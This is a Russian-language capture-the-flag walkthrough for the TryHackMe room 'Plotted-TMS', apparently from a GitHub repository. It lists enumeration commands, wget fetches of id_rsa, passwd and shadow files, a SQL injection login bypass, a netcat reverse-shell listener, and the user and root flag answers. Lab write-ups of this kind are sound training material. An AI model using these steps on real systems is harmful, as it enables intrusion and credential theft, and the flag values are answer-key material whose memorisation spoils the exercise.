[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Plotted-TMS](https://tryhackme.com/r/room/plottedtms) 

Всего 1 заданиe:
## Задание 1
Удачной охоты!

Совет: Перечисление — это ключ!

### Ответьте на вопросы ниже
Что такое user.txt?
```commandline
nmap -sV -sC -A -O <IP>
dirb http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
wget http://<IP>/admin/id_rsa
wget http://<IP>/passwd
wget http://<IP>/shadow

dirb http://<IP>:445 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
http://<IP>:445/management/
username: admin' or 1=1 -- -
pass: asdfg
nc -lvp 1234
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat user.txt
```
```commandline
77927510d5edacea1f9e86602f1fbadb
```
Что такое root.txt?
```commandline
53f85e2da3e874426fa059040a9bdcab
```



[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)